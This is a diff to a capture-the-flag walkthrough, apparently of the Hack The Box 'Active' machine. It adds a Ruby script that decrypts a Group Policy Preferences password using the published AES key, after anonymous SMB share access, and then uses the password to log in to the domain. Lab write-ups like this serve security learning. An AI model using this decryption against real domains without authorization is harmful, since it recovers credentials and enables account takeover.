@@ -195,3 +195,36 @@ smbclient \\\\active.htb\\Replication -I 10.129.190.90 -N
 </Groups>
 ```
 > With a quick google search of `group policy password decrypt` we will find a tool called [gpp-decrypt](https://www.kali.org/tools/gpp-decrypt/) due to the way my machine is configured I will instead use a ruby script that does the same thing
+> due to the way my machine is configured I will use a script that decrypts the password for me locally aswell 
+
+```ruby
+
+require 'rubygems'
+require 'openssl'
+require 'base64'
+
+encrypted_data = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+
+def decrypt(encrypted_data)
+  padding = "=" * (4 - (encrypted_data.length % 4))
+  epassword = "#{encrypted_data}#{padding}"
+  decoded = Base64.decode64(epassword)
+
+  key = "\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b"
+  aes = OpenSSL::Cipher::Cipher.new("AES-256-CBC")
+  aes.decrypt
+  aes.key = key
+  plaintext = aes.update(decoded)
+  plaintext << aes.final
+  pass = plaintext.unpack('v*').pack('C*') # UNICODE conversion
+
+  return pass
+end
+
+blah = decrypt(encrypted_data)
+puts blah
+```
+> With the decrypted password we can authenticate to the domain as the user SVG_TGS
+
+# FOOT HOLD
+
